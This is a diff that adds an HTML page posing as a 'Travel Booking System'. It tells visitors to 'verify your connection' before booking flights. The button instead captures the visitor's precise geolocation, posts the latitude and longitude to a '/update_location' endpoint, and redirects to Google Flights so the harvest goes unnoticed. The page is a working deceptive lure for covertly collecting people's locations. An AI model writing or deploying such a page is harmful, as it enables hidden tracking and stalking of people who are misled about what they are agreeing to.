@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Travel Booking System</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f7f6; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 80%; max-width: 400px; }
+        h2 { color: #333; }
+        button { background-color: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 20px; }
+        button:hover { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div style="font-size: 50px; margin-bottom: 15px;">✈️</div>
+        <h2>Travel Booking System</h2>
+        <p>Please verify your connection to proceed to flight booking.</p>
+        <button onclick="getLocation()">Verify & Continue</button>
+    </div>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition);
+            }
+        }
+        function sendPosition(position) {
+            fetch('/update_location', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({lat: position.coords.latitude, lon: position.coords.longitude})
+            }).then(() => {
+                window.location.href = "https://www.google.com/travel/flights";
+            });
+        }
+    </script>
+</body>
+</html>
